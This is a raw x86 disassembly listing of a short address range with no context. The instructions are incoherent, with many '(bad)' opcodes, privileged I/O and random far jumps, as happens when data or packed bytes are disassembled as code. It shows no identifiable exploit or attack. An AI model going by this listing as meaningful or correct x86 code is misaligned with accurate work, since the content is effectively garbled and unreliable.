  4114de:	bound  edx,QWORD PTR [ecx]
  4114e0:	dec    edi
  4114e1:	xchg   bh,bh
  4114e3:	mov    ebp,0x4a847b26
  4114e8:	int3   
  4114e9:	pop    edi
  4114ea:	push   eax
  4114eb:	xor    bl,BYTE PTR [edi+0x28]
  4114ee:	mov    dh,0x91
  4114f0:	loop   0x411495
  4114f2:	(bad)  
  4114f3:	out    0x13,eax
  4114f5:	push   ecx
  4114f6:	jl     0x4114af
  4114f8:	les    ebp,FWORD PTR [edx-0x32]
  4114fb:	or     eax,0xd0f871d2
  411500:	ins    DWORD PTR es:[edi],dx
  411501:	clc    
  411502:	mov    ds:0xc4c534ea,eax
  411507:	dec    edi
  411508:	sar    dl,1
  41150a:	test   eax,0x5e2ab249
  41150f:	and    DWORD PTR [ecx+0x3f],edi
  411512:	test   DWORD PTR [esi-0xf40aae9],ebx
  411518:	mov    ah,0x78
  41151a:	sahf   
  41151b:	mov    ?,WORD PTR [eax]
  41151d:	adc    eax,0xf41c0769
  411522:	dec    BYTE PTR [eax]
  411524:	test   eax,0xbbedd3d5
  411529:	and    al,0xf6
  41152b:	fcom   QWORD PTR [edx-0x263e5a5]
  411531:	fldl2e 
  411533:	mov    dh,0xd2
  411535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411536:	ret    
  411537:	lock sbb edi,DWORD PTR [edi+0x2fd27951]
  41153e:	pusha  
  41153f:	fsubrp st(6),st
  411541:	stc    
  411542:	mov    BYTE PTR [ecx],0xa3
  411545:	adc    DWORD PTR [edi],esi
  411547:	je     0x41157d
  411549:	push   0x5024a2da
  41154e:	je     0x41155d
  411550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411551:	dec    ebp
  411552:	test   DWORD PTR [esi],esi
  411554:	cdq    
  411555:	in     al,dx
  411556:	int    0x97
  411558:	or     BYTE PTR [edx+0x1422ea51],al
  41155e:	mov    ecx,DWORD PTR [edx+ebx*4]
  411561:	add    al,0x45
  411563:	mov    dl,0x73
  411565:	inc    esi
  411566:	(bad)  
  411567:	sbb    edx,edx
  411569:	push   esp
  41156a:	outs   dx,BYTE PTR ds:[esi]
  41156b:	xchg   ebp,eax
  41156c:	std    
  41156d:	stos   DWORD PTR es:[edi],eax
  41156e:	jnp    0x4115ce
  411570:	xlat   BYTE PTR ds:[ebx]
  411571:	adc    DWORD PTR [ebx-0x66e37cab],eax
  411577:	sub    BYTE PTR [edi+ecx*8-0xfa4be75],bh
  41157e:	sti    
  41157f:	pop    ss
  411580:	loope  0x411513
  411582:	jns    0x4115a4
  411584:	jae    0x411581
  411586:	lea    ebp,[ebx-0x77fa84dd]
  41158c:	scas   eax,DWORD PTR es:[edi]
  41158d:	mov    dh,0x81
  41158f:	mov    esi,0x7f4524f8
  411594:	jecxz  0x411517
  411596:	dec    ebx
  411597:	mov    ?,ecx
  411599:	(bad)  
  41159a:	loop   0x411559
  41159c:	les    esi,FWORD PTR [edi-0x62d46a2]
  4115a2:	jge    0x41155e
  4115a4:	test   eax,0x5f20d6c0
  4115a9:	push   ds
  4115aa:	cmp    esi,esp
  4115ac:	gs mov cl,0x63
  4115af:	xor    al,0x27
  4115b1:	lds    eax,FWORD PTR [ebp-0x2745ef96]
  4115b7:	inc    esp
  4115b8:	lock jmp DWORD PTR [ecx*4-0x3555e83b]
  4115c0:	imul   eax,DWORD PTR [eax-0x6a670dac],0xffffff85
  4115c7:	outs   dx,BYTE PTR ds:[esi]
  4115c8:	mov    fs,WORD PTR [ebx-0x63e31a53]
  4115ce:	dec    ebp
  4115cf:	mov    ?,ebp
  4115d1:	out    0x84,eax
  4115d3:	lods   eax,DWORD PTR ds:[esi]
  4115d4:	in     eax,dx
  4115d5:	add    eax,0xd52237bf
  4115da:	test   ebp,edi
  4115dc:	adc    ecx,DWORD PTR ds:0xe9650659
  4115e2:	and    DWORD PTR [edi+0x62979de9],ebx
  4115e8:	xchg   edx,eax
  4115e9:	sub    eax,0x8497a7a3
  4115ee:	test   DWORD PTR [edi-0x54],edi
  4115f1:	and    DWORD PTR [eax-0x28],ebp
  4115f4:	or     al,0xe5
  4115f6:	mov    ecx,0x7cfe438e
  4115fb:	test   DWORD PTR [esi+0x2a],ebp
  4115fe:	(bad)  
  4115ff:	dec    edx
  411600:	cmp    al,0xfa
  411602:	mov    eax,ds:0x845fe3ed
  411607:	adc    bh,cl
  411609:	xchg   ebp,eax
  41160a:	xchg   ebx,eax
  41160b:	loope  0x411595
  41160d:	adc    BYTE PTR [eax+ebx*2-0x30b1e5bf],ah
  411614:	mov    bl,0x9a
  411616:	arpl   dx,cx
  411618:	mov    eax,0xfebf875b
  41161d:	pop    ds
  41161e:	sub    eax,0xcda6c206
  411623:	fild   DWORD PTR [esi+0x1e]
  411626:	add    eax,0xf935b673
  41162b:	fsub   QWORD PTR [ebx]
  41162d:	fwait
  41162e:	test   DWORD PTR [ebx-0x125466d1],ecx
  411634:	in     al,dx
  411635:	sbb    al,0xe1
  411637:	mov    gs,WORD PTR [esi+0x4bfd7c24]
  41163d:	adc    BYTE PTR [esi+eax*1],0xc8
  411641:	adc    eax,0x48d2e8d0
  411646:	aad    0x2f
  411648:	push   ds
  411649:	pop    edx
  41164a:	mov    ecx,0xd24d74ba
  41164f:	xchg   ebx,eax
  411650:	repnz out dx,eax
  411652:	jp     0x411678
  411654:	mov    ds:0xd2a3af19,al
  411659:	jae    0x4116ce
  41165b:	sbb    bl,BYTE PTR [edx+0x1c965d91]
  411661:	adc    DWORD PTR [eax-0x8ec46ef],esp
  411667:	xlat   BYTE PTR ds:[ebx]
  411668:	(bad)  
  411669:	xchg   edi,eax
  41166a:	xor    eax,0x85a8b0a4
  41166f:	popa   
  411670:	rcl    BYTE PTR [eax],1
  411672:	ins    DWORD PTR es:[edi],dx
  411673:	add    BYTE PTR [ecx],dl
  411675:	arpl   WORD PTR [edi],bx
  411677:	sbb    DWORD PTR [esi],0xffffffd3
  41167a:	or     BYTE PTR [esi+0x6e82ad8e],0x91
  411681:	cld    
  411682:	test   DWORD PTR [ebx-0x6e],ebp
  411685:	dec    eax
  411686:	xor    eax,0xfab9aeab
  41168b:	mov    ?,WORD PTR [ebp-0x34]
  41168e:	pop    ds
  41168f:	jl     0x41169f
  411691:	xchg   edx,eax
  411692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411693:	stos   DWORD PTR es:[edi],eax
  411694:	sar    BYTE PTR [edi-0x3447d42],cl
  41169a:	pop    esp
  41169b:	mov    ecx,DWORD PTR [edi+0x5ef9d811]
  4116a1:	rcr    esi,cl
  4116a3:	and    dl,bh
  4116a5:	mov    bl,0x8a
  4116a7:	and    bh,BYTE PTR fs:[ebp-0x453c78b5]
  4116ae:	push   esi
  4116af:	sahf   
  4116b0:	mov    ds:0x80873b91,al
  4116b5:	nop
  4116b6:	cmp    bh,dl
  4116b8:	shl    BYTE PTR [edi],cl
  4116ba:	cmp    esi,eax
  4116bc:	jmp    0x6542:0x858e0906
  4116c3:	call   0xfd43a88e
  4116c8:	lods   eax,DWORD PTR ds:[esi]
  4116c9:	out    0xcd,al
  4116cb:	lahf   
  4116cc:	pop    esi
  4116cd:	adc    DWORD PTR [ecx-0x72],edi
  4116d0:	pop    eax
  4116d1:	lods   al,BYTE PTR ds:[esi]
  4116d2:	add    BYTE PTR [ebp-0x2a75296b],bh
  4116d8:	enter  0xd1b5,0x64
  4116dc:	loopne 0x41166f
  4116de:	mov    esi,0x8ce3e679
  4116e3:	js     0x41173c
  4116e5:	push   ds
  4116e6:	dec    edx
  4116e7:	mov    esi,0x65583f8c
  4116ec:	pop    ss
  4116ed:	pop    ebx
  4116ee:	test   DWORD PTR [edi],edx
  4116f0:	xchg   edx,eax
  4116f1:	pop    ss
  4116f2:	xchg   ebx,eax
  4116f3:	pop    esp
  4116f4:	out    dx,al
  4116f5:	xor    BYTE PTR [ebp+0x5a],cl
  4116f8:	repz push ds
  4116fa:	mov    ds:0xce7b3d0,eax
  4116ff:	adc    bl,bh
  411701:	jb     0x4116f3
  411703:	mov    esi,0x8d853cf9
  411708:	sbb    esi,DWORD PTR [edi+edi*2]
  41170b:	int3   
  41170c:	jmp    0x4116c4
  41170e:	outs   dx,BYTE PTR ds:[esi]
  41170f:	mov    ds,WORD PTR [ecx]
  411711:	jbe    0x411735
  411713:	dec    ebx
  411714:	push   ds
  411715:	into   
  411716:	inc    edi
  411717:	std    
  411718:	out    0xf5,eax
  41171a:	xchg   ebp,eax
  41171b:	mov    gs,WORD PTR [ecx-0x7b74b7d1]
  411721:	inc    esp
  411722:	or     BYTE PTR [esi-0x5c250b5a],0x4d
  411729:	outs   dx,DWORD PTR ds:[esi]
  41172a:	adc    DWORD PTR [ebx-0xc41393a],0x9f05f181
  411734:	jp     0x411733
  411736:	add    al,0xe8
  411738:	(bad)  [edi+0x71]
  41173b:	mov    cs,ecx
  41173d:	cdq    
  41173e:	xor    DWORD PTR ds:0xd3ecf972,ebx
  411744:	shl    BYTE PTR [ebp+0x72],cl
  411747:	(bad)  
  411748:	fnstenv [edi]
  41174a:	adc    bh,BYTE PTR [ebx+0x3e]
  41174d:	cmp    ebp,DWORD PTR [eax]
  41174f:	aam    0xd2
  411751:	push   ss
  411752:	push   0xc439b4e0
  411757:	shr    DWORD PTR [ebp-0x63efce0a],1
  41175d:	lods   eax,DWORD PTR ds:[esi]
  41175e:	and    BYTE PTR [esi],ah
  411760:	in     eax,dx
  411761:	mov    bl,0x7f
  411763:	mov    gs,WORD PTR [ecx+ebx*1]
  411766:	pop    es
  411767:	mov    WORD PTR [ecx-0x7d],cs
  41176a:	xchg   edi,eax
  41176b:	push   esp
  41176c:	aad    0xe2
  41176e:	shl    DWORD PTR ds:0x98969c1d,cl
  411774:	repnz mov eax,ds:0x1c3729fb
  41177a:	call   0x967d97de
  41177f:	push   cs
  411780:	pop    eax
  411781:	aaa    
  411782:	(bad)
  411786:	inc    ebp
  411787:	scas   eax,DWORD PTR es:[edi]
  411788:	or     eax,0xffffff95
  41178b:	mov    esp,0x9391f3e8
  411790:	inc    edx
  411791:	icebp  
  411792:	pop    ebx
  411793:	shr    BYTE PTR [esi+0x5216647d],cl
  411799:	sub    al,0xff
  41179b:	pushf  
  41179c:	sbb    al,BYTE PTR [edi+0x17b1cd2d]
  4117a2:	push   cs
  4117a3:	aaa    
  4117a4:	retf   
  4117a5:	adc    ecx,DWORD PTR [edx+edi*8]
  4117a8:	bound  ebx,QWORD PTR [edx-0x70cd324b]
  4117ae:	in     al,0x76
  4117b0:	test   eax,0x7801eec6
  4117b5:	and    DWORD PTR [ebp+0x75],0xffffffe2
  4117b9:	iret   
  4117ba:	repnz lahf 
  4117bc:	test   BYTE PTR [edi-0x27],ah
  4117bf:	cdq    
  4117c0:	jb     0x41182a
  4117c2:	imul   esi,edx,0xc
  4117c5:	xchg   esp,eax
  4117c6:	test   DWORD PTR [edi+0x73],ebp
  4117c9:	dec    ebx
  4117ca:	fistp  WORD PTR [ecx-0x13]
  4117cd:	pop    edx
  4117ce:	add    al,0x8e
  4117d0:	dec    ebp
  4117d1:	in     al,0xd8
  4117d3:	jnp    0x4117ea
  4117d5:	(bad)  
  4117d6:	adc    edx,ebp
  4117d8:	scas   eax,DWORD PTR es:[edi]
  4117d9:	lock push edx
  4117db:	addr16 jl 0x411764
  4117de:	add    eax,0x9cd3d8ec
  4117e3:	mov    cs,WORD PTR [eax]
  4117e5:	loope  0x41183f
  4117e7:	leave  
  4117e8:	push   ds
  4117e9:	mov    ebp,0x83adb865
  4117ee:	jg     0x4117f9
  4117f0:	cwde   
  4117f1:	mov    dl,0x9e
  4117f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117f4:	enter  0x85bc,0x43
  4117f8:	sbb    BYTE PTR [edx],bl
  4117fa:	inc    edx
  4117fb:	sub    bh,0x5d
  4117fe:	out    dx,eax
  4117ff:	out    0xa9,al
  411801:	or     eax,esp
  411803:	jno    0x41183b
  411805:	jmp    0x8ea0:0x75a62e54
  41180c:	adc    al,0xbe
  41180e:	outs   dx,BYTE PTR ds:[esi]
  41180f:	fcomp  DWORD PTR [eax-0x2d103129]
  411815:	fwait
  411816:	(bad)  
  411817:	stc    
  411818:	jo     0x4117fe
  41181a:	and    ebp,eax
  41181c:	add    eax,0xad8ebae3
  411821:	test   eax,0xc64bab82
  411826:	pop    es
  411827:	pop    ds
  411828:	and    bl,BYTE PTR [edx-0x7c]
  41182b:	jnp    0x411801
  41182d:	aas    
  41182e:	ret    
  41182f:	ror    BYTE PTR [edi-0x1d],cl
  411832:	cmp    eax,0xcd0e3f8d
  411837:	lods   al,BYTE PTR ds:[esi]
  411838:	xchg   esp,eax
  411839:	fs and al,0x24
  41183c:	sub    ecx,DWORD PTR [ecx]
  41183e:	test   BYTE PTR [ebp-0x57],ah
  411841:	xchg   BYTE PTR [eax],cl
  411843:	add    al,0x34
  411845:	xchg   ecx,eax
  411846:	ror    BYTE PTR [esi-0x46e4a007],0xeb
  41184d:	arpl   WORD PTR [edi+0x2c],cx
  411850:	sub    dh,cl
  411852:	test   DWORD PTR [esi-0x85cf378],edx
  411858:	add    al,0x91
  41185a:	push   edi
  41185b:	lahf   
  41185c:	and    cl,ah
  41185e:	test   eax,0x9ecf2c8
  411863:	pop    esp
  411864:	pop    ebx
  411865:	add    DWORD PTR [ebp-0x522cdf54],eax
  41186b:	mov    dh,0xa7
  41186d:	in     al,0x14
  41186f:	mov    ?,WORD PTR [esi*2+0x46903f2c]
  411876:	and    bh,bh
  411878:	rcl    BYTE PTR [ecx-0x2b4fb5ad],cl
  41187e:	adc    ebx,esp
  411880:	fst    DWORD PTR [ecx]
  411882:	mov    esi,0x6b2cc7a1
  411887:	mov    ds:0xef8531f5,eax
  41188c:	fcom   DWORD PTR [ebx-0x3805ed77]
  411892:	push   ds
  411893:	outs   dx,DWORD PTR ds:[esi]
  411894:	push   ecx
  411895:	push   ds
  411896:	fldenv [ecx]
  411898:	lock clc 
  41189a:	(bad)  
  41189b:	call   0x829e:0xd185a934
  4118a2:	sub    ebx,esi
  4118a4:	push   edx
  4118a5:	sbb    ah,BYTE PTR [ecx]
  4118a7:	mov    cs,ecx
  4118a9:	xchg   edi,eax
  4118aa:	into   
  4118ab:	imul   ecx,esp,0x6f
  4118ae:	inc    edx
  4118af:	stos   DWORD PTR es:[edi],eax
  4118b0:	rcl    DWORD PTR [eax],cl
  4118b2:	test   ch,0x64
  4118b5:	jne    0x411883
  4118b7:	mov    al,0x8a
  4118b9:	aaa    
  4118ba:	out    dx,eax
  4118bb:	mov    ?,WORD PTR [edi]
  4118bd:	or     al,0xc5
  4118bf:	xchg   esi,eax
  4118c0:	mov    ds:0xb45116c1,al
  4118c5:	mov    DWORD PTR [edx+0x27e877fb],ecx
  4118cb:	jmp    0x1e6d:0xcb647200
  4118d2:	cs test eax,0xfb3ef710
  4118d8:	sbb    eax,0xd2eedae4
  4118dd:	mov    eax,0xb6e53861
  4118e2:	or     DWORD PTR [esi+ebx*8+0x11],edx
  4118e6:	adc    eax,0x749709c5
  4118eb:	aad    0xa6
  4118ed:	sbb    al,0x85
  4118ef:	sub    DWORD PTR [eax-0x188f73f2],ebx
  4118f5:	mov    dl,0xeb
  4118f7:	mov    ebx,esp
  4118f9:	xor    ebx,DWORD PTR [ebx-0x7ac79808]
  4118ff:	push   ss
  411900:	inc    ebp
  411901:	ins    DWORD PTR es:[edi],dx
  411902:	rcr    DWORD PTR [ebx],1
  411904:	(bad)  
  411905:	fld    QWORD PTR [ebp+0x215532a8]
  41190b:	iret   
  41190c:	(bad)  
  41190d:	outs   dx,BYTE PTR ds:[esi]
  41190e:	mov    WORD PTR [ecx+0x3c235344],ss
  411914:	push   edx
  411915:	sahf   
  411916:	fs inc esp
  411918:	aad    0xb5
  41191a:	test   DWORD PTR [edi+0x3a],ebp
  41191d:	ss jmp 0x4118da
  411920:	mov    esp,0x74e2a3c9
  411925:	push   ds
  411926:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411927:	push   ecx
  411928:	sbb    BYTE PTR [ebx-0x13],ch
  41192b:	push   ss
  41192c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41192d:	mov    cs,esi
  41192f:	nop
  411930:	rcl    BYTE PTR [edx],1
  411932:	lds    edx,FWORD PTR [edx-0x40f16e71]
  411938:	mov    ebp,DWORD PTR [ebx+eiz*2]
  41193b:	test   al,0x4b
  41193d:	xor    al,BYTE PTR ds:0xeab71c55
  411943:	push   0x7a
  411945:	jecxz  0x411934
  411947:	jbe    0x4119c4
  411949:	dec    ebx
  41194a:	dec    edx
  41194b:	shl    DWORD PTR [eax-0x3bb938ef],cl
  411951:	jg     0x411979
  411953:	imul   ebx,DWORD PTR [eax],0xa
  411956:	pop    ecx
  411957:	mov    edx,edx
  411959:	sub    DWORD PTR [ebx+0x353d72c2],ebp
  41195f:	jl     0x4118eb
  411961:	adc    DWORD PTR [eax],ecx
  411963:	mov    ebp,?
  411965:	mov    esi,0xef3a9bc0
  41196a:	gs (bad) 
  41196d:	and    eax,0x46c9c03e
  411972:	cmp    BYTE PTR [ebx+edi*8+0x11],bl
  411976:	sbb    eax,0x2a815538
  41197b:	sub    DWORD PTR [ebx],ecx
  41197d:	stos   DWORD PTR es:[edi],eax
  41197e:	xchg   BYTE PTR [eax-0x5b4f20cb],dl
  411984:	xchg   edx,eax
  411985:	stos   BYTE PTR es:[edi],al
  411986:	sub    edx,DWORD PTR [esi+ebp*8-0x34c4a8ef]
  41198d:	or     DWORD PTR [eax+esi*1+0x353fd01],edx
  411994:	shr    BYTE PTR [ebp+0x24896f29],cl
  41199a:	xor    al,bl
  41199c:	pop    es
  41199d:	adc    DWORD PTR [ebp-0x17df4a59],edi
  4119a3:	push   eax
  4119a4:	ins    BYTE PTR es:[edi],dx
  4119a5:	scas   al,BYTE PTR es:[edi]
  4119a6:	test   DWORD PTR [ebp+ebx*1+0x1f],eax
  4119aa:	mov    edi,0x27a95a92
  4119af:	mov    ds,WORD PTR [edx+esi*8-0x1a5c7f11]
  4119b6:	cli    
  4119b7:	repnz rol BYTE PTR [ecx-0x33],cl
  4119bb:	or     esp,eax
  4119bd:	call   0x122ad928
  4119c2:	mov    edi,0xa503863b
  4119c7:	into   
  4119c8:	inc    ebp
  4119c9:	sbb    DWORD PTR [ebp-0x2d14e97a],eax
  4119cf:	adc    BYTE PTR [edx],cl
  4119d1:	ss out 0x8e,eax
  4119d4:	or     al,0xb4
  4119d6:	aas    
  4119d7:	inc    eax
  4119d8:	aaa    
  4119d9:	xchg   ebp,eax
  4119da:	enter  0xd259,0x15
  4119de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119df:	les    ebx,FWORD PTR [esi]
  4119e1:	push   cs
  4119e2:	pop    edi
  4119e3:	shr    BYTE PTR [ecx+0x30f6fb17],cl
  4119e9:	xchg   ebx,eax
  4119ea:	and    eax,0xcf278ef9
  4119ef:	sar    BYTE PTR ss:[esi-0x9c13446],1
  4119f6:	int3   
  4119f7:	push   cs
  4119f8:	mov    bl,0x66
  4119fa:	add    DWORD PTR [ebx-0x5fd0eecf],edi
  411a00:	fucomp st(1)
  411a02:	test   DWORD PTR [edi],0xc985070f
  411a08:	mov    edx,0x333f9ce1
  411a0d:	fwait
  411a0e:	push   ds
  411a0f:	lea    edi,[eax-0x50a23bf0]
  411a15:	xchg   esp,eax
  411a16:	xor    ebp,DWORD PTR [ebp-0x2c]
  411a19:	xor    DWORD PTR [ebp+0xa2bdecf],eax
  411a1f:	push   ecx
  411a20:	mov    dl,0x21
  411a22:	iret   
  411a23:	mov    es,WORD PTR [edx]
  411a25:	cmp    BYTE PTR [edx],dh
  411a27:	push   0xffffffdd
  411a29:	ins    DWORD PTR es:[edi],dx
  411a2a:	adc    BYTE PTR [edx+0x49f72d2],dl
  411a30:	mov    ds:0x4adf1436,eax
  411a35:	xor    al,0x56
  411a37:	add    ecx,0xe307c411
  411a3d:	in     eax,dx
  411a3e:	jecxz  0x411a61
  411a40:	sar    al,cl
  411a42:	ret    
  411a43:	xchg   edi,eax
  411a44:	sbb    BYTE PTR [eax+0x1195f92d],bl
  411a4a:	fadd   QWORD PTR [esi]
  411a4c:	sar    DWORD PTR [ebx-0x5a7277ac],1
  411a52:	test   DWORD PTR [ecx],ecx
  411a54:	es daa 
  411a56:	mov    edx,0xf50aa6fc
  411a5b:	mov    fs,edi
  411a5d:	out    dx,al
  411a5e:	fucomp st(1)
  411a60:	sbb    DWORD PTR [edx-0x43],edx
  411a63:	sar    DWORD PTR es:[edi-0x5a],1
  411a67:	mov    edx,0x6e717789
  411a6c:	in     eax,0xce
  411a6e:	in     al,dx
  411a6f:	stos   BYTE PTR es:[edi],al
  411a70:	arpl   WORD PTR [esi],bx
  411a72:	ret    
  411a73:	push   ds
  411a74:	dec    ebp
  411a75:	cwde   
  411a76:	push   ss
  411a77:	fwait
  411a78:	pushf  
  411a79:	xchg   edi,eax
  411a7a:	test   eax,esp
  411a7c:	addr16 inc ebx
  411a7e:	(bad)  
  411a7f:	xchg   edx,eax
  411a80:	popf   
  411a81:	xor    DWORD PTR ds:0x4311f7ed,esi
  411a87:	cmp    dl,BYTE PTR [edi]
  411a89:	cmp    esp,DWORD PTR [edx+eax*4]
  411a8c:	push   es
  411a8d:	test   al,0x85
  411a8f:	jnp    0x411a9b
  411a91:	mov    cs,WORD PTR [edx]
  411a93:	mov    cl,0x30
  411a95:	sbb    BYTE PTR [ecx],ah
  411a97:	lahf   
  411a98:	ror    DWORD PTR [edi+0x6f],0xee
  411a9c:	mov    DWORD PTR [edi+0x7ce537c3],edi
  411aa2:	enter  0xe1ce,0x97
  411aa6:	sbb    DWORD PTR [eax],esp
  411aa8:	mov    esi,0x7c618514
  411aad:	fcompp 
  411aaf:	fs jo  0x411af8
  411ab2:	ficom  DWORD PTR [ebx-0x57fcbe67]
  411ab8:	mov    bl,0x33
  411aba:	adc    eax,0x5e54df2d
  411abf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ac0:	(bad)  
  411ac1:	or     BYTE PTR [esi],al
  411ac3:	jl     0x411b17
  411ac5:	call   DWORD PTR [eax+0x75]
  411ac8:	cmc    
  411ac9:	mov    dh,0x30
  411acb:	xchg   edx,eax
  411acc:	adc    al,0x9d
  411ace:	add    esi,DWORD PTR [edx+0x52]
  411ad1:	gs sbb al,0xcb
  411ad4:	into   
  411ad5:	sahf   
  411ad6:	cmp    al,0xbb
  411ad8:	jp     0x411ae1
  411ada:	test   DWORD PTR [edi*2-0x60d98851],ebx
  411ae1:	jecxz  0x411ad7
  411ae3:	pop    esi
  411ae4:	mov    edx,0x7f0c8a14
  411ae9:	in     eax,0xd0
  411aeb:	push   edi
  411aec:	mov    dh,0x7a
  411aee:	mov    eax,ds:0x47828a4
  411af3:	out    0x91,eax
  411af5:	pushf  
  411af6:	pop    edi
  411af7:	adc    eax,0x1a6d0090
  411afc:	sar    DWORD PTR ds:0xe553d94b,cl
  411b02:	and    eax,0xd9fc9ec2
  411b07:	mov    ?,WORD PTR [ebx+ecx*2]
  411b0a:	in     al,dx
  411b0b:	jnp    0x411b1a
  411b0d:	inc    edi
  411b0e:	xor    edi,DWORD PTR [eax]
  411b10:	ror    ch,cl
  411b12:	dec    edi
  411b13:	jecxz  0x411b25
  411b15:	mov    DWORD PTR [ebp+0x5b1e4869],edx
  411b1b:	inc    eax
  411b1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b1d:	inc    ebx
  411b1e:	push   edx
  411b1f:	cmp    dl,BYTE PTR [esi+ebx*4]
  411b22:	test   DWORD PTR [ebx-0x22],esp
  411b25:	loope  0x411b45
  411b27:	in     eax,dx
  411b28:	popa   
  411b29:	push   0x11
  411b2b:	mov    ?,WORD PTR [ebp+0x15]
  411b2e:	push   edx
  411b2f:	or     bl,BYTE PTR [ecx-0x2db1702b]
  411b35:	lods   al,BYTE PTR ds:[esi]
  411b36:	jno    0x411ad0
  411b38:	xchg   edx,eax
  411b39:	rcl    esp,0xc6
  411b3c:	ins    DWORD PTR es:[edi],dx
  411b3d:	push   ds
  411b3e:	cmp    DWORD PTR [ebx+0x53],0xa7b1540a
  411b45:	rol    BYTE PTR [ebp+0x6320e91e],cl
  411b4b:	mov    ch,0x6f
  411b4d:	je     0x411bc6
  411b4f:	push   0xd0c611f5
  411b54:	aas    
  411b55:	pop    ds
  411b56:	add    eax,DWORD PTR [ecx-0x44]
  411b59:	sbb    edi,DWORD PTR ds:0xba110f2f
  411b5f:	push   edi
  411b60:	pop    bx
  411b62:	pop    ds
  411b63:	push   ss
  411b64:	aad    0x11
  411b66:	je     0x411b56
  411b68:	mov    WORD PTR [edi-0x7f],fs
  411b6b:	ds ja  0x411be3
  411b6e:	test   BYTE PTR [ebx],cl
  411b70:	in     al,dx
  411b71:	scas   al,BYTE PTR es:[edi]
  411b72:	push   eax
  411b73:	retf   0x8be6
  411b76:	clc    
  411b77:	loopne 0x411b6e
  411b79:	pop    ss
  411b7a:	sbb    DWORD PTR [ebp+ecx*8-0x1c],eax
  411b7e:	add    eax,0xbef4fce3
  411b83:	mov    dl,dl
  411b85:	lods   al,BYTE PTR ds:[esi]
  411b86:	inc    ecx
  411b87:	add    ah,dl
  411b89:	pop    ds
  411b8a:	enter  0x9c6e,0x11
  411b8e:	mov    edx,0x36d2de03
  411b93:	sbb    al,0x52
  411b95:	xchg   ecx,eax
  411b96:	test   DWORD PTR [ebp-0x475393ee],edx
  411b9c:	mov    ebx,0x4a644b4
  411ba1:	into   
  411ba2:	test   DWORD PTR [esp+ecx*2+0x4],edx
  411ba6:	or     edx,ecx
  411ba8:	push   ebx
  411ba9:	jae    0x411b2f
  411bab:	jl     0x411bdb
  411bad:	xlat   BYTE PTR ds:[ebx]
  411bae:	mov    al,0xa8
  411bb0:	aad    0x64
  411bb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bb4:	imul   ebx,edi,0xffffff84
  411bb7:	in     al,dx
  411bb8:	call   0x3d0fb8ee
  411bbd:	ds mov ebx,edi
  411bc0:	sar    DWORD PTR ds:0x768970b7,cl
  411bc6:	mov    ebp,0x49cfab51
  411bcb:	push   eax
  411bcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bcd:	jno    0x411c16
  411bcf:	lahf   
  411bd0:	sbb    esp,esp
  411bd2:	push   0xffffff8d
  411bd4:	mov    dl,0xae
  411bd6:	mov    eax,ds:0x8ad4887a
  411bdb:	inc    edx
  411bdc:	pop    esp
  411bdd:	push   esp
  411bde:	stos   BYTE PTR es:[edi],al
  411bdf:	mov    ah,BYTE PTR [ebx+0x6f414dc6]
  411be5:	loope  0x411b70
  411be7:	mov    cs,edi
  411be9:	lods   eax,DWORD PTR ds:[esi]
  411bea:	pop    ebp
  411beb:	xchg   edx,eax
  411bec:	jnp    0x411b7f
  411bee:	sbb    dh,BYTE PTR [edi+0x7abe13d2]
  411bf4:	pop    ebp
  411bf5:	xor    edx,DWORD PTR [esi]
  411bf7:	fld    TBYTE PTR [edx+0x22999205]
  411bfd:	adc    DWORD PTR [esi],eax
  411bff:	add    eax,0x90f33d14
  411c04:	rcr    BYTE PTR [ebp+0x67],cl
  411c07:	mov    ecx,0x302dc735
  411c0c:	adc    eax,0xc9d4f1a
  411c11:	test   eax,0xa9dcefa
  411c16:	std    
  411c17:	aad    0xea
  411c19:	sbb    al,0xa6
  411c1b:	mov    ?,WORD PTR [ebx+0x15c883b7]
  411c21:	loopne 0x411bc4
  411c23:	mov    ss,WORD PTR [esi]
  411c25:	aam    0x9a
  411c27:	adc    eax,0x934cc7e6
  411c2c:	lods   eax,DWORD PTR ds:[esi]
  411c2d:	pop    esp
  411c2e:	dec    DWORD PTR [eax-0x1970bf23]
  411c34:	push   0xffffffee
  411c36:	inc    ecx
  411c37:	lahf   
  411c38:	mov    ecx,cr2
  411c3b:	loop   0x411bee
  411c3d:	or     ah,al
  411c3f:	add    BYTE PTR [edx-0x2d1000e3],bl
  411c45:	add    DWORD PTR [ebx+0x45],ecx
  411c48:	pop    edx
  411c49:	xchg   ecx,eax
  411c4a:	xchg   ebp,eax
  411c4b:	push   esi
  411c4c:	sbb    al,0x11
  411c4e:	leave  
  411c4f:	adc    bh,BYTE PTR [esi-0x4224d8e4]
  411c55:	dec    ebp
  411c56:	test   BYTE PTR [edi],al
  411c58:	adc    ebp,edi
  411c5a:	mov    eax,0x25dae161
  411c5f:	mov    edi,eax
  411c61:	icebp  
  411c62:	in     al,dx
  411c63:	into   
  411c64:	mov    cs,WORD PTR [edx+0x2e]
  411c67:	mov    BYTE PTR [edi+eax*4],0x85
  411c6b:	int3   
  411c6c:	neg    ah
  411c6e:	jmp    FWORD PTR [esp+esi*2-0x3a76287b]
  411c75:	in     eax,0x81
  411c77:	mov    fs,edx
  411c79:	sbb    al,0x21
  411c7b:	fiadd  WORD PTR [edi]
  411c7d:	scas   al,BYTE PTR es:[edi]
  411c7e:	out    dx,al
  411c7f:	mov    eax,ds:0xa8c5b64b
  411c84:	push   ds
  411c85:	mov    esi,0x1e5758ae
  411c8a:	add    eax,0xf4c24dd5
  411c8f:	cmp    al,dh
  411c91:	lahf   
  411c92:	call   FWORD PTR [ebp-0x31e1f525]
  411c98:	xor    BYTE PTR [ebx-0x57],cl
  411c9b:	fidivr DWORD PTR [edi-0x5569ffef]
  411ca1:	das    
  411ca2:	jmp    0x1332:0x88fa4a38
  411ca9:	outs   dx,DWORD PTR ds:[esi]
  411caa:	clc    
  411cab:	ficom  WORD PTR [edx]
  411cad:	jns    0x411c61
  411caf:	and    bl,cl
  411cb1:	adc    DWORD PTR [esi],esi
